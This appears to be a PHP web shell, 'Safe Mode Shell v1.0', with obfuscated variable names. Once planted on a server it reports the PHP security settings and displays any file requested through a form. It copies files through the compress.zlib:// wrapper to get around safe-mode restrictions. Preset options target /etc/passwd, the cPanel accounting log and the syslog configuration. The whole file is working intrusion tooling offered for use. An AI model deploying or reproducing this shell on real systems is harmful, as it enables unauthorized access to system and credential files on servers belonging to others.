<?php
?>
<head>
<meta http-equiv="Content-Language" content="en-us">
</head>
<STYLE>TD { FONT-SIZE: 8pt; COLOR: #ebebeb; FONT-FAMILY: verdana;}BODY { scrollbar-face-color: #800000; scrollbar-shadow-color: #101010; scrollbar-highlight-color: #101010; scrollbar-3dlight-color: #101010; scrollbar-darkshadow-color: #101010; scrollbar-track-color: #101010; scrollbar-arrow-color: #101010; font-family: Verdana;}TD.header { FONT-WEIGHT: normal; FONT-SIZE: 10pt; BACKGROUND: #7d7474; COLOR: white; FONT-FAMILY: verdana;}A { FONT-WEIGHT: normal; COLOR: #dadada; FONT-FAMILY: verdana; TEXT-DECORATION: none;}A:unknown { FONT-WEIGHT: normal; COLOR: #ffffff; FONT-FAMILY: verdana; TEXT-DECORATION: none;}A.Links { COLOR: #ffffff; TEXT-DECORATION: none;}A.Links:unknown { FONT-WEIGHT: normal; COLOR: #ffffff; TEXT-DECORATION: none;}A:hover { COLOR: #ffffff; TEXT-DECORATION: underline;}.skin0{position:absolute; width:200px; border:2px solid black; background-color:menu; font-family:Verdana; line-height:20px; cursor:default; visibility:hidden;;}.skin1{cursor: default; font: menutext; position: absolute; width: 145px; background-color: menu; border: 1 solid buttonface;visibility:hidden; border: 2 outset buttonhighlight; font-family: Verdana,Geneva, Arial; font-size: 10px; color: black;}.menuitems{padding-left:15px; padding-right:10px;;}input{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}textarea{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}button{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}select{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}option {background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}iframe {background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}p {MARGIN-TOP: 0px; MARGIN-BOTTOM: 0px; LINE-HEIGHT: 150%}blockquote{ font-size: 8pt; font-family: Courier, Fixed, Arial; border : 8px solid #A9A9A9; padding: 1em; margin-top: 1em; margin-bottom: 5em; margin-right: 3em; margin-left: 4em; background-color: #B7B2B0;}body,td,th { font-family: verdana; color: #d9d9d9; font-size: 11px;}body { background-color: #000000;}</style>
<p align="center"><b><font face="Webdings" size="6" color="#FF0000">!</font><font face="Verdana" size="5" color="#DADADA"><a href="?	"><span style="color: #DADADA; text-decoration: none; font-weight:700"><font face="Times New Roman">Safe 
Mode Shell v1.0</font></span></a></font><font face="Webdings" size="6" color="#FF0000">!</font></b></p>
<form method="POST">
	<p align="center"><input type="text" name="file" size="20">
	<input type="submit" value="Open" name="B1"></p>
</form>
	<form method="POST">
		<p align="center"><select size="1" name="file">
		<option value="/etc/passwd">Get /etc/passwd</option>
		<option value="/var/cpanel/accounting.log">View cpanel logs</option>
		<option value="/etc/syslog.conf">Syslog configuration</option>
		<option value="/etc/hosts">Hosts</option>
		</select> <input type="submit" value="Go" name="B1"></p>
	</form>


<?php  echo '[syslog]01
'; echo '<head><title>Safe Mode Shell</title></head>'; $spc62d5f = './'; if (@ini_get('safe_mode') or strtolower(@ini_get('safe_mode')) == 'on') { $sp867936 = true; $sp7bd164 = '<font color="red">ON (secure)</font>'; } else { $sp867936 = false; $sp7bd164 = '<font color="green">OFF (not secure)</font>'; } echo "Safe-mode: {$sp7bd164}"; $spe2ff4f = @ini_get('open_basedir'); if ($spe2ff4f or strtolower($spe2ff4f) == 'on') { $sp9461a8 = true; $spce4cbf = '<font color="red">' . $spe2ff4f . '</font>'; } else { $sp9461a8 = false; $spce4cbf = '<font color="green">OFF (not secure)</font>'; } echo '<br>'; echo "Open base dir: {$spce4cbf}"; echo '<br>'; echo 'Disable functions : <b>'; if ('' == ($spf6ef8d = @ini_get('disable_functions'))) { echo '<font color=green>NONE</font></b>'; } else { echo "<font color=red>{$spf6ef8d}</font></b>"; } $sp7997f0 = 'true'; if (!$sp7997f0) { $sp7997f0 = 0; } $spfd360f = 'true'; if (!$spfd360f) { $spfd360f = 0; } $sp2f5415 = $spfd360f - $sp7997f0; $spb889a2 = @round(100 / ($spfd360f / $sp7997f0), 2); echo '[syslog]03
'; echo '<PRE>
'; if (empty($spa3ecf0)) { if (empty($_GET['file'])) { if (empty($_POST['file'])) { die('
Welcome.. By This script you can jump in the (Safe Mode=ON) .. Enjoy
 <B><CENTER><FONT
COLOR="RED">PHP Emperor
xb5@hotmail.com</FONT></CENTER></B>'); } else { $spa3ecf0 = $_POST['file']; } } else { $spa3ecf0 = $_GET['file']; } } echo '[syslog]02
'; $sp4eb460 = tempnam($spc62d5f, 'cx'); if (copy('compress.zlib://' . $spa3ecf0, $sp4eb460)) { $sp67ff1a = fopen($sp4eb460, 'r'); $spf447af = fread($sp67ff1a, filesize($sp4eb460)); fclose($sp67ff1a); echo '<B>--- Start File ' . htmlspecialchars($spa3ecf0) . '
-------------</B>
' . htmlspecialchars($spf447af) . '
<B>--- End File
' . htmlspecialchars($spa3ecf0) . ' ---------------
'; unlink($sp4eb460); die('
<FONT COLOR="RED"><B>File
' . htmlspecialchars($spa3ecf0) . ' has been already loaded. PHP Emperor <xb5@hotmail.com>
;]</B></FONT>'); } else { die('<FONT COLOR="RED"><CENTER>Sorry... File
<B>' . htmlspecialchars($spa3ecf0) . '</B> dosen\'t exists or you don\'t have
access.</CENTER></FONT>'); } echo '[syslog]03
'; ?>

<?php 